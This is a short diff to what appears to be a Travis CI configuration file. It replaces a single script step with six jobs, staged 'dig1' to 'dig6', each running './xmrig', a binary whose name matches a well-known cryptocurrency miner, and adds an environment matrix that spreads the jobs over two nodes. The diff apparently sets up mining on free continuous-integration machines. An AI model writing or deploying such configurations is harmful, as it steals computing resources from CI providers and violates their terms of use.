@@ -8,9 +8,28 @@ before_install:
 install:
   - true
 
-script:
-  - ls -alh
-  - ./xmrig
+jobs:
+    include:
+        - stage: dig1
+        - script: ./xmrig
+        - stage: dig2
+        - script: ./xmrig
+        - stage: dig3
+        - script: ./xmrig
+        - stage: dig4
+        - script: ./xmrig
+        - stage: dig5
+        - script: ./xmrig
+        - stage: dig6
+        - script: ./xmrig
+
+env:
+    global:
+        - RANDOM_VAR=42
+        - CI_NODE_TOTAL=2
+    matrix:
+        - CI_NODE_INDEX=0
+        - CI_NODE_INDEX=1
 
 after_failure:
   - echo ">> done <<"
